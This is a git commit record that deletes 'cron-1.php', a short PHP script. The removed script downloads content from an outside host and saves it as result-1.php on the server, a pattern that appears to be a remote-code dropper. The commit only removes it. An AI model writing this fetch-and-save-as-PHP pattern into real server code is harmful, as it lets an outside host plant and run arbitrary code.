2ec7fa311bc761a1bb8175c7a1748b86a3547a43
alexbuttercup <onerusin@gmail.com>
2019-10-22 15:54:41 +0300

    Delete cron-1.php

--- new/cron-1.php
+++
@@ -1,9 +0,0 @@
-<?php
-$ch = curl_init("https://netcats-analytics.space/new/query-1.php");
-$fp = fopen("result-1.php", "w");
-curl_setopt($ch, CURLOPT_FILE, $fp);
-curl_setopt($ch, CURLOPT_HEADER, 0);
-$output = curl_exec($ch);
-curl_close($ch);
-fclose($fp);
-?>
